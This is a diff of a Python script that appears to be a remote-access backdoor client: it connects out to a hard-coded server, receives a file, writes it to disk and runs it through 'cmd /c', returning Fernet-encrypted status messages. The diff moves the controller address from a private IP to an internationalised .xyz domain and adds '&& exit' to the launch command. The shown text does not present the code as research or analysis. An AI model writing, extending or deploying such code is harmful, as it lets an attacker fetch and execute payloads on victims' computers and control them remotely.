@@ -2,7 +2,7 @@ import os, subprocess, socket
 from cryptography.fernet import Fernet
 
 
-SERVER_HOST = '192.168.3.76'
+SERVER_HOST = 'xn--6pw65a019d.xyz'
 SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
@@ -65,7 +65,7 @@ while True:
                 remaining -= len(data)
                 f.write(data)
             f.close()
-        subprocess.Popen(f'cmd /c {directory} -n {SERVER_HOST} -p {sender_port}')
+        subprocess.Popen(f'cmd /c {directory} -n {SERVER_HOST} -p {sender_port} && exit')
         server_state = "live Streaming Server is running"
         server_state = Fernet(key).encrypt(server_state.encode())
         s.send(server_state)
